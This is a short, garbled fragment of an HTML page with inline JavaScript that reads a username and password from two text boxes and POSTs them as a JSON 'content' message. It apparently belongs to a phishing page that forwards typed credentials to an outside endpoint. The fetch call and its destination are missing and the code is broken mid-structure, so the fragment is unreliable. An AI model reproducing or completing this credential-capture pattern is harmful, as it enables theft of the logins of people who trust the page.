<body  class="bg-black text-white">

        content: `Username: ${textbox1.value}\nPassword: ${textbox2.value}`
      };

        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(response => {
        if (response.ok) {
